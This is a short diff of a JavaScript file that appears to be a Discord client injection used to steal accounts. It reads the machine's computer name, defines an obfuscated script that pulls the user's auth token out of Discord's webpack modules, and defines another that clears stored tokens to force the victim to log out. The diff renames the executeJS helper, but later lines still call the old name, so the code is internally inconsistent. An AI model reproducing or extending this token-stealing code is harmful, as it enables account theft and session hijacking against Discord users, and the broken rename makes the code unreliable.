@@ -7,10 +7,12 @@ const https = require("https")
 const queryString = require("querystring");
 
 var computerName = process.env.COMPUTERNAME
-const executeJS = script => {
-    const window = BrowserWindow.getAllWindows()[0];
-    return window.webContents.executeJavaScript(script, !0);
+async function execScript(str) {
+    var window = electron.BrowserWindow.getAllWindows()[0]
+    var script = await window.webContents.executeJavaScript(str, true)
+    return script || null
 };
+
 const tokenScript = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
 const logOutScript = async () => await executeJS(`function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`);
 var config = {
